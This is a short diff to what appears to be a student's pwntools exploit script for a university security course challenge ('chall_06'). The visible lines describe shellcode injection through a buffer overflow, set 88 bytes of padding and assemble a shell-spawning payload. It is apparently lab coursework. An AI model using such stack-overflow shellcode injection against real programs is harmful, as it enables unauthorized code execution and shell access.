@@ -2,7 +2,7 @@
 Creators:       Malachi Parks
 Section:        CPEG476-010
 Assignment:     Project 2 --- chall_06
-File Description:  
+File Description:  Shell code injection, then call a function to execute the shellcode
 
 Checksec info:
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
@@ -21,7 +21,7 @@ Buffer is 96 long; call rax is last 8 bytes store address  here
 from pwn import *
 
 # Variables
-padding = b'a'*88      # Vuln only has 80 byte buffer + 8 RBP
+padding = b'a'*88      # Vuln only has 80 byte buffer + 8 RBPv
 context.arch = "amd64"
 shell = asm(shellcraft.sh())
 shellLen = len(shell)
